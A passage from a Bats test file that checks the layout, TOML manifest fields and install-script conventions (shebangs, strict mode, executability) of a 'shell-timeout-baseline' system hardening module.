    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
p = data.get('phase', '')
assert p in {'main', 'early', 'late'}, f'phase must be canonical {main,early,late}, got {p!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install] block present as TOML table — top-level install-section contract)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
inst = data.get('install')
assert isinstance(inst, dict), f'[install] must be TOML table, got {type(inst).__name__}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml version field present + non-empty — version-required contract)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = data.get('version', '')
assert v, f'version must be non-empty, got {v!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install_paths].paths includes at least one /etc/ path — operator-config-staging-target contract)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any(p.startswith('/etc/') for p in ps), f'paths must include ≥1 /etc/ target, got {ps!r}'
"
}

@test "INVARIANT (shell-timeout-baseline README.md exists in module dir — operator-doc-trail contract)" {
    readme="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/README.md"
    [ -f "${readme}" ]
}

@test "INVARIANT (shell-timeout-baseline install/apply.sh uses set -euo pipefail — Bash strict-mode contract)" {
    apply="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/apply.sh"
    [ -f "${apply}" ]
    grep -qE '^set -euo pipefail' "${apply}"
}

@test "INVARIANT (shell-timeout-baseline install/check.sh uses set -euo pipefail — Bash strict-mode contract)" {
    chk="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/check.sh"
    [ -f "${chk}" ]
    grep -qE '^set -euo pipefail' "${chk}"
}

@test "INVARIANT (shell-timeout-baseline install/check.sh is executable (mode includes +x) — script-runnable contract)" {
    chk="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/check.sh"
    [ -x "${chk}" ]
}

@test "INVARIANT (shell-timeout-baseline install/uninstall.sh uses set -euo pipefail — Bash strict-mode contract)" {
    uni="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/uninstall.sh"
    [ -f "${uni}" ]
    grep -qE '^set -euo pipefail' "${uni}"
}

@test "INVARIANT (shell-timeout-baseline install/uninstall.sh is executable — script-runnable contract)" {
    uni="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/uninstall.sh"
    [ -x "${uni}" ]
}

@test "INVARIANT (shell-timeout-baseline install scripts apply+check+uninstall all exist as files — 3-script lifecycle contract)" {
    inst_dir="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install"
    [ -f "${inst_dir}/apply.sh" ]
    [ -f "${inst_dir}/check.sh" ]
    [ -f "${inst_dir}/uninstall.sh" ]
}

@test "INVARIANT (shell-timeout-baseline install/apply.sh declares bash shebang — bash-interpreter contract)" {
    apply="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/apply.sh"
    head -1 "${apply}" | grep -qE '#!/.*bash|#!/usr/bin/env bash'
}

@test "INVARIANT (shell-timeout-baseline install/check.sh declares bash shebang — bash-interpreter contract)" {
    chk="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/check.sh"
    head -1 "${chk}" | grep -qE '#!/.*bash'
}

@test "INVARIANT (shell-timeout-baseline install/uninstall.sh declares bash shebang — bash-interpreter contract)" {
    uni="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/uninstall.sh"
    head -1 "${uni}" | grep -qE '#!/.*bash'
}

@test "INVARIANT (shell-timeout-baseline install/apply.sh declares non-empty body — non-trivial-script contract)" {
    apply="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/apply.sh"
    [ -s "${apply}" ]
    lines=$(wc -l <"${apply}")
    [ "${lines}" -gt 5 ]
}

@test "INVARIANT (shell-timeout-baseline install/check.sh declares non-empty body — non-trivial-script contract)" {
    chk="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/check.sh"
    [ -s "${chk}" ]
}

@test "INVARIANT (shell-timeout-baseline install/uninstall.sh declares non-empty body — non-trivial-script contract)" {
    uni="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/uninstall.sh"
    [ -s "${uni}" ]
}

@test "INVARIANT (shell-timeout-baseline module.toml has TOML parser-safe structure — Python tomllib parse-success contract)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert isinstance(data, dict), 'TOML root must be table'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml exists at canonical path modules/shell-timeout-baseline/module.toml — canonical-module-dir layout)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
}

@test "INVARIANT (shell-timeout-baseline module dir is at canonical path modules/shell-timeout-baseline/ — dir-layout 72-cycle)" {
    mod_dir="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline"
    [ -d "${mod_dir}" ]
}

@test "INVARIANT (shell-timeout-baseline install dir exists at modules/shell-timeout-baseline/install — install-dir-existence 73-cycle)" {
    inst_dir="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install"
    [ -d "${inst_dir}" ]
}

@test "INVARIANT (shell-timeout-baseline install dir non-empty — install-content-presence 74-cycle)" {
    inst="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install"
    n=$(ls "${inst}" 2>/dev/null | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (shell-timeout-baseline install/apply.sh size > 100 bytes — substantial-apply-script 75-cycle)" {
    apply="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/apply.sh"
    size=$(stat -c '%s' "${apply}")
    [ "${size}" -gt 100 ]
}

@test "INVARIANT (shell-timeout-baseline install/check.sh size > 50 bytes — substantial-check-script 76-cycle)" {
    chk="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/check.sh"
    size=$(stat -c '%s' "${chk}")
    [ "${size}" -gt 50 ]
}

@test "INVARIANT (shell-timeout-baseline install/uninstall.sh size > 50 bytes — substantial-uninstall-script 77-cycle)" {
    uni="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/uninstall.sh"
    size=$(stat -c '%s' "${uni}")
    [ "${size}" -gt 50 ]
}

@test "INVARIANT (shell-timeout-baseline module.toml first-line includes a comment or name — TOML-table-start-canonical 78)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    head -1 "${mtoml}" | grep -qE '^#|^name'
}

@test "INVARIANT (shell-timeout-baseline install/apply.sh has shebang line — POSIX-conformant 79)" {
    apply="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/apply.sh"
    head -1 "${apply}" | grep -qE '^#!'
}

@test "INVARIANT (shell-timeout-baseline install/check.sh has shebang line — POSIX-conformant 80)" {
    chk="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/check.sh"
    head -1 "${chk}" | grep -qE '^#!'
}

@test "INVARIANT (shell-timeout-baseline install/uninstall.sh has shebang line — POSIX-conformant 81)" {
    uni="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/uninstall.sh"
    head -1 "${uni}" | grep -qE '^#!'
}

@test "INVARIANT (shell-timeout-baseline install/check.sh is non-empty file — non-trivial-check-script 82)" {
    chk="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/check.sh"
    [ -s "${chk}" ]
}

@test "INVARIANT (shell-timeout-baseline install/uninstall.sh is non-empty file — non-trivial-uninstall-script 83)" {
    uni="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/uninstall.sh"
    [ -s "${uni}" ]
}

@test "INVARIANT (shell-timeout-baseline install/apply.sh declares first 30 lines with set -euo pipefail — strict-mode-prologue 84)" {
    apply="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/apply.sh"
    head -30 "${apply}" | grep -qE 'set -euo'
}

@test "INVARIANT (shell-timeout-baseline install/check.sh first 30 lines have set -euo prologue — strict-mode-prologue 85)" {
    chk="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/check.sh"
    head -30 "${chk}" | grep -qE 'set -euo'
}

@test "INVARIANT (shell-timeout-baseline install/uninstall.sh first 30 lines have set -euo prologue — strict-mode-prologue 86)" {
    uni="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/uninstall.sh"
    head -30 "${uni}" | grep -qE 'set -euo'
}

@test "INVARIANT (shell-timeout-baseline module.toml install_paths.paths list contains string entries 87 — typed-paths-list)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert isinstance(ps, list)
"
}

@test "INVARIANT (shell-timeout-baseline module.toml install_paths.paths only absolute paths 88 — abs-path-canonical)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
for p in ps:
    assert isinstance(p, str) and p.startswith('/'), f'{p!r} not absolute'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml install_paths.paths all start with /etc /usr /var /lib /opt or /run — canonical-root-prefix 89)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
prefixes = ('/etc/', '/usr/', '/var/', '/lib/', '/opt/', '/run/', '/srv/', '/boot/')
for p in ps:
    assert any(p.startswith(pf) for pf in prefixes), f'{p!r} not canonical-root'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml has at least 1 entry in install_paths.paths — non-empty-manifest 90)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert len(ps) >= 1
"
}

@test "INVARIANT (shell-timeout-baseline module.toml install_paths.paths first entry under /etc/ — config-staging-canonical 91)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
# Just verify at least one /etc/ entry exists for installer-class modules
assert any(p.startswith('/etc/') for p in ps), f'no /etc/ entry'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml install_paths.scope canonical-system 92 — operator-scope-fixed)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
sc = (data.get('install_paths') or {}).get('scope', '')
assert sc in ('system', 'user', '')
"
}

@test "INVARIANT (shell-timeout-baseline module.toml install_paths.paths has /etc/selfdef/ entry 93 — selfdef-config-staging-canonical)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any('/etc/selfdef/' in p for p in ps)
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install_paths] block declared at line beginning — TOML-section-header 94)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    grep -qE '^\[install_paths\]' "${mtoml}"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install] block declared at line beginning — TOML-section-header 95)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    grep -qE '^\[install\]' "${mtoml}"
}

@test "INVARIANT (shell-timeout-baseline module.toml uses TOML key-value assignment syntax — well-formed-TOML 96)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    grep -qE '^name[[:space:]]*=' "${mtoml}"
}

@test "INVARIANT (shell-timeout-baseline module.toml name field uses double-quoted string syntax — TOML-string-quote 97)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    grep -qE '^name[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (shell-timeout-baseline module.toml version field uses double-quoted string syntax — TOML-string-quote 98)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    grep -qE '^version[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (shell-timeout-baseline module.toml category field uses double-quoted string syntax — TOML-string-quote 99)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    grep -qE '^category[[:space:]]*=[[:space:]]*"' "${mtoml}"
}
